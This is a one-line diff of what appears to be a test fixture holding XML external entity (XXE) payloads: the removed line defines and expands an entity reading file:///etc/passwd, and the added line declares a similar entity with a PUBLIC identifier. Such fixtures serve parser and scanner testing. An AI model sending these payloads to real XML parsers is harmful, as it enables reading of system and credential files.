@@ -1,1 +1,1 @@
-<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE aa[<!ELEMENT bb ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><foo>&xxe;</foo></root>
+<!DOCTYPE aa[<!ELEMENT bb ANY><!ENTITY xxe PUBLIC "blob" "file:///etc/passwd">]>
